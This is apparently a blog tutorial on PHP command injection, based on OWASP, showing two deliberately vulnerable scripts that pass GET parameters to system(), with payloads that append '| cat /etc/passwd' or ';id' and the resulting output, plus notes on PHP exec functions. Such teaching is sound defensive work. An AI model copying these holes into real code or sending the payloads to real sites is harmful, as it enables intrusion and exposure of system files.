---
layout: post
title: "[WEB]Command Injection"
date: 2018-12-26 23:18:02 +0800
categories: [security,web]
tags: [security,web]
---

### **Example 1**
```php
<?php
$dir = $_GET["dir"];
if (isset($dir))
{
echo "<pre>";
system("ls -al ".$dir);
echo "</pre>";
}
?>
```
<pre>
payload: http://localhost/ex1.php?dir=| cat /etc/passwd
</pre>

### **Example 2**
```php
<?php
print("Please specify the name of the file to delete");
print("<p>");
$file=$_GET['filename'];
system("rm $file");
?>
```
#### Request
<pre>payload: http://127.0.0.1/delete.php?filename=bob.txt;id</pre>

#### Response

<pre>
Please specify the name of the file to delete

uid=33(www-data) gid=33(www-data) groups=33(www-data) 
</pre>

---


```
命令注入攻擊PHP中可以使用下列5個函數來執行外部的應用程序或函數
system、exec、passthru、shell_exec、``(與shell_exec功能相同)函數原型

string system(string command, int &return_var)

command 要執行的命令

return_var 存放執行命令的執行後的狀態值

string exec (string command, array &output, int &return_var)

command 要執行的命令

output 獲得執行命令輸出的每一行字符串

return_var 存放執行命令後的狀態值

void passthru (string command, int &return_var)

command 要執行的命令

return_var 存放執行命令後的狀態值

string shell_exec (string command)

command 要執行的命令
```


參考來源<br />
[https://www.owasp.org/index.php/Command_Injection](https://www.owasp.org/index.php/Command_Injection)